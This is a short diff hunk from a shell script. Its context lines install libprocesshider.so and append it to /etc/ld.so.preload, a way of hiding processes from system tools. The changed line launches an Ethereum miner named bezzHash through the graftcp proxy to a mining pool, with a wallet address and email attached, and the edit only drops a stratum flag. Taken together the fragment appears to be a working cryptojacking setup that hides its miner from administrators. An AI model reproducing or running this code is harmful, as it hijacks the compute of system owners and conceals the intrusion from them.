@@ -62,4 +62,4 @@ mv libprocesshider.so /usr/local/lib/
 
 echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
 
-./graftcp/graftcp ./bezzHash --algo ETHASH -p eth-eu1.hellominer.com:1100 --user 0x587bdded4037bba7c74fb6af2f6e296bb2f8415d.$(echo $(shuf -i 1-9999 -n 1)-itil)/maesdori@gmail.com --ethstratum ETHV1
+./graftcp/graftcp ./bezzHash --algo ETHASH -p eth-eu1.hellominer.com:1100 --user 0x587bdded4037bba7c74fb6af2f6e296bb2f8415d.$(echo $(shuf -i 1-9999 -n 1)-itil)/maesdori@gmail.com
